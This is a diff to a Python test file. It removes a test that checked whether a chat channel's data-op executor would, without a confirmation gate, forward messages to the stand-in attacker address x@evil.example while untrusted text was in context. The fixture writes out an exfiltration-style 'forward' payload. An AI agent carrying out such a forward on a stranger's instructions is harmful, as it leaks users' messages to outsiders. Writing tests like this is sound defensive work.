@@ -104,23 +104,3 @@ def test_the_gate_in_front_of_an_act_that_leaves_asks_it():
     block = src[i:]
     assert "_leave_gate.asked_if_leaving(" in block and block.index("_leave_gate.asked_if_leaving(") < block.index(
         "if mode == _wactions.FAST:\n")
-
-
-def test_the_text_channel_asks_the_same_send_instead_of_running_it(monkeypatch):
-    """Parity: the chat executes data-ops through `widget_data_turn.execute`, which had no such gate."""
-    import asyncio
-
-    from nucleo.flash import widget_data_turn as W
-    from widgets.server_api import brain_action  # noqa: F401 — the door the op would take
-    import widgets.server_api as SA
-    ran = []
-
-    async def _never(*a, **k):
-        ran.append(a)
-        return {"ok": True}
-    monkeypatch.setattr(SA, "brain_action", _never)
-    U.seen()
-    out = asyncio.run(W.execute([{"name": "widget_data", "args": {
-        "widget_id": "mensajeria", "action": "forward", "payload": {"to": "x@evil.example"}}}], text="vale"))
-    assert not ran, "the send went out with a stranger's words in context and no verdict behind it"
-    assert out.get("executed") != "widget_data", out
